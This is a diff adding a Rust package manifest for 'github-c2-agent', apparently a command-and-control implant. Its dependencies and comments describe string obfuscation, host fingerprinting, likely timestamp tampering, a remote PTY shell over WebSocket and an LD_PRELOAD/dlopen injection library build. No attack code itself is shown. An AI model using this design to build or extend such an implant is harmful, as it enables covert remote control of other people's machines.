@@ -1,0 +1,60 @@
+[package]
+name = "github-c2-agent"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+tokio = { version = "1", features = ["full"] }
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+aes-gcm = "0.10"
+sha2 = "0.10"
+hmac = "0.12"
+pbkdf2 = "0.12"
+base64 = "0.22"
+rand = "0.8"
+chrono = "0.4"
+libc = "0.2"
+whoami = "1"
+filetime = "0.2"
+# default-features=false + explicit "tls" crate feature: lets cross-checks run
+# `cargo check --no-default-features` to skip rustls/ring (no cross C toolchain
+# needed on Windows) WITHOUT ever patching this file. Production builds use the
+# default features (TLS on). NEVER ship a --no-default-features build.
+ureq = { version = "2", default-features = false, features = ["json"] }
+# net.rs 在 tls feature 下直接用 rustls 类型；必须显式声明，否则 Windows
+# 上 cargo check 会 E0433（ureq/tls 不会把 rustls 再导出给本 crate）。
+rustls = { version = "0.23", optional = true, default-features = false, features = ["std", "tls12", "ring"] }
+obfstr = "0.4"
+md-5 = "0.10"
+flate2 = "1"
+
+# WS PTY long-connection shell (cliws-based, Linux only)
+[target.'cfg(unix)'.dependencies]
+websocket = { version = "0.26", default-features = false, features = ["sync"] }
+nix = { version = "0.29", features = ["term", "process", "signal", "ioctl", "fs"] }
+
+[[bin]]
+name = "github-c2-agent"
+path = "src/main.rs"
+
+# 共享库版本（LD_PRELOAD / dlopen 注入）# 注意：musl 目标不支持 cdylib，不能用 --target x86_64-unknown-linux-musl
+# 构建方式（gnu 目标）：
+#   cargo build --release --features shared-lib-entry
+# 若要在生产中使用 SO，需要单独构建：
+#   cargo build --release --lib --target x86_64-unknown-linux-gnu --features shared-lib-entry
+[lib]
+name = "github_c2_agent"
+crate-type = ["rlib"]        # rlib 兼容 musl；如需 cdylib 按 gnu 目标单独构建
+path = "src/lib_entry.rs"
+
+[features]
+default = ["tls"]
+tls = ["ureq/tls", "dep:rustls"]
+shared-lib-entry = []
+debug-mode = []   # 调试日志输出（生产编译不开启）
+
+[profile.release]
+opt-level = "z"
+lto = true
+strip = true
